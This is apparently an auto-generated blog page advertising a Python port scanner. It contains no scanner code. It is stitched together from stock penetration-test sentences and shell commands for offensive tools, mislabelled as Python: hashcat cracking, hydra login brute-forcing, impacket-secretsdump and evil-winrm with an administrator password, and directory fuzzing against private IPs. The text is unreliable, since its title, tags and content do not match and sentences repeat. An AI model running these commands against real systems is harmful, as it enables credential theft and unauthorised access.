---
TitleSEO: "Automated Port Scanner in Python | ZureFX"
TitlePost: "Automated Port Scanner — Python"
Author: "ZureFX"
Description: "A Python script for automated port scanner. Built for security research and automation."
Keywords: "python, fuzzer, tool, powershell, go, c"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-511.html"
URL_IMAGES: ""
Date: "2025-04-04"
Tags: "Python, Fuzzer, Tool, PowerShell, Go, C"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-511"
Permalink: "/scripting/script-automated-port-scanner-511.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `GetNPUsers`
- `ffuf`
- `rpcclient`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.73.193.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p9200,5432,993 10.24.215.11 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.80.5.178
nmap -sCV -p21,135,23 10.102.244.9 -oN scan.txt
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.66.59.153/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.114.101/FUZZ
evil-winrm -i 10.25.113.56 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.121.43.51/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.155.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 8.41s
```
